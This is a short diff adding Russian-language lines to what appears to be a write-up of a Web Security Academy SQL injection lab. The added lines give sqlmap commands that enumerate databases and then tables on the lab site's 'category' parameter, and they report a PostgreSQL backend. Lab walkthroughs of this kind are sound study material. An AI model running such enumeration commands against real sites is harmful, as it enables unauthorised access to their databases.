@@ -23,3 +23,7 @@
 
 ![Решения](images/Screenshot_2026-10-01_21_47_39.png)
 
+После данной проверки: `sqlmap -u 'https://0aca0014040a7a0780c18014007b001f.web-security-academy.net/filter?category=Pets' --dbs` в файле `log` я узнал, что мы имеем дело с PostgreSQL, база данных сайта имеет два столбца, схема по названием `public`, теперь можно узнать название столбцов таблицы данных с помощью такой проверки: `sqlmap -u "https://0aca0014040a7a0780c18014007b001f.web-security-academy.net/filter?category=Pets" --batch -D public --tables`, посмотрим результат:
+
+![Решения](images/Screenshot_2026-10-01_21_54_19.png)
+
